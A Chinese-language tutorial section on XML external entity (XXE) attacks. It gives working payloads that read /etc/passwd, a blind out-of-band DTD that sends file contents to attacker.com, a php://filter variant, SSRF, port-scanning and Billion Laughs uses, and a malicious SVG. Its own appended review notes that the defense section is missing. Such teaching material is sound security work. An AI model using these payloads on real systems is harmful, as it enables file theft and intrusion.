# XXE漏洞深入

### 7.1 XXE基础回顾

XXE（XML外部实体注入）利用 XML 解析器处理外部实体的特性：

```xml
<!-- 基础 XXE 读取文件 -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>

<!-- 利用原理: XML 解析器在处理 DTD 时加载外部实体 -->
<!-- 有回显: 直接在响应中看到文件内容 -->
```

### 7.2 Blind XXE（OOB外带数据）

当 XXE 无直接回显时，利用外部 DTD + HTTP 请求外带数据：

```xml
<!-- payload.xml -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
  %ext;
]>
<data>&send;</data>

<!-- attacker.com/evil.dtd -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/log?d=%file;'>">
%all;

<!-- 数据流: 读取文件 → URL 编码 → HTTP 请求外带 → DNS/HTTP 日志 -->
```

利用 `php://filter` 协议可处理读取内容中的特殊字符：

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### 7.3 XXE多场景利用

```
XXE 利用场景:
├── 读取文件: file:///etc/passwd / file:///C:/Windows/win.ini
├── SSRF: http://internal-service:port/
├── 内网端口扫描: http://192.168.1.1:PORT/ (通过响应/时间判断)
├── DoS: Billion Laughs 攻击（递归实体膨胀）
│   <!ENTITY lol "lol">
│   <!ENTITY lol2 "&lol;&lol;..."> (递归扩展消耗内存)
└── 命令执行: PHP expect:// 协议（需安装 expect 扩展）
```

### 7.4 SVG XXE

SVG 文件本身是 XML 格式，在支持 SVG 上传和渲染的场景中可触发 XXE：

```xml
<!-- malicious.svg -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="20">&xxe;</text>
</svg>

<!-- 利用场景: 文件上传 SVG → 服务端解析 SVG → 触发 XXE -->
```

---

---

## 📋 内容审核与补充建议

> 针对「XXE漏洞深入」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
